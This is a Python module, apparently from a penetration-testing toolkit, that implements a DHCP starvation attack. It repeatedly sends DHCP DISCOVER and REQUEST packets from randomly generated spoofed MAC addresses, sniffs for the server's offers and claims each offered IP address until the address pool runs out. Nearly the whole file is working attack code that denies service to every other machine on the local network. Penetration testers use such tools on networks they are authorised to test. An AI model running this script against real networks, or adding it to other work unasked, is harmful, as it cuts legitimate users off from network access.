from ptsrvtester.protocols.dhcp.utils.registry import (random_xid, random_mac, 
                                                       sendp, prepare_discover_packet, sniff, BOOTP, prepare_request_packet)



__MODULELABEL__ = "DHCP starvation attack"
__MODULECODE__ = "starvation"
__ORDER__ = 100


def _run_starvation(ctx):
    """Run DHCP starvation attack"""
    ctx.out("Running DHCP starvation attack...", "WARNING", indent=4)
    ctx.out("Press Ctrl+C to stop", "INFO", indent=4)

    try:
        count = 0
        max_count = ctx.count if hasattr(ctx, 'count') and ctx.count else None

        while max_count is None or count < max_count:
            src_mac = random_mac()
            transaction_id = random_xid()
            requested_ip = None

            # Send DISCOVER
            offer_filter = f"udp and src port 67 and (ether dst ff:ff:ff:ff:ff:ff or ether dst {src_mac})"
            sendp(prepare_discover_packet(src_mac, transaction_id), ctx.interface, verbose=False)

            # Wait for OFFER
            def is_offer(packet):
                nonlocal requested_ip
                if packet.haslayer(BOOTP) and packet[BOOTP].xid == transaction_id:
                    if packet[BOOTP].yiaddr != "0.0.0.0":
                        requested_ip = packet[BOOTP].yiaddr
                        return True
                return False

            sniff(iface=ctx.interface, filter=offer_filter, promisc=True,
                  timeout=10, stop_filter=is_offer)

            if requested_ip:
                # Send REQUEST
                sendp(prepare_request_packet(src_mac, transaction_id, requested_ip),
                      ctx.interface, verbose=False)
                ctx.out(f"[+] Obtained {requested_ip} for {src_mac}", "OK", indent=4)
                count += 1
            else:
                ctx.out("[-] No OFFER received, server may be exhausted", "WARNING", indent=4)
                break

    except KeyboardInterrupt:
        ctx.out("\n[!] Starvation attack stopped by user", "INFO", indent=4)
    except Exception as e:
        ctx.out(f"[-] Error during starvation: {str(e)}", "ERROR", indent=4)

    ctx.out(f"[*] Total IPs obtained: {count}", "INFO", indent=4)

def run(ctx):
    _run_starvation(ctx)